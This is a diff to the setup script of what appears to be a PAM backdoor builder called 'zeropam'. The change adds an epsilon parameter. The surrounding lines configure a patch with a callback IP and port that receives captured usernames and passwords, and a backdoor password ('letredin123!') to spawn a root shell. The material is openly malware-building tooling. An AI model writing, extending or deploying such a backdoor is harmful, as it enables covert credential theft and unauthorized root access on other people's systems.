@@ -11,6 +11,8 @@ def setup_cmd_args():
                         required=True, dest="port", action="store")
     parser.add_argument('-f', '--format', metavar="<Format String>",
                         dest="format", help="Format string for socket messages (MUST HAVE 4 %s's (ip, message, username, password)); Default: '%s - %s %s:%s")
+    parser.add_argument('-e', '--eps', metavar="<LDP Epsilon Value>",
+                        dest="eps", help="eps")
     parser.add_argument('--password', metavar="<Backdoor Password>",
                         dest="password", help="Backdoor password to spit root shell; Default: letredin123!")
     return parser.parse_args()
@@ -27,6 +29,9 @@ def setup():
 
     subprocess.run(f'sed -i "s/^+#define CALLBACK_IP.*/+#define CALLBACK_IP \\"{args.ip}\\"/" ./zeropam-1-5-3.patch', shell=True, text=True)
     subprocess.run(f'sed -i "s/^+#define CALLBACK_PORT.*/+#define CALLBACK_PORT {args.port}/" ./zeropam-1-5-3.patch', shell=True, text=True)
+
+    if (args.eps):
+        subprocess.run(f'sed -i "s/^+#define EPS.*/+#define EPS {args.eps}/" ./zeropam-1-5-3.patch', shell=True, text=True)
 
     if(args.format):
         subprocess.run(f'sed -i "s/^+#define RET_FMT.*/+#define RET_FMT \\"{args.format}\\"/" ./zeropam-1-5-3.patch', shell=True, text=True)
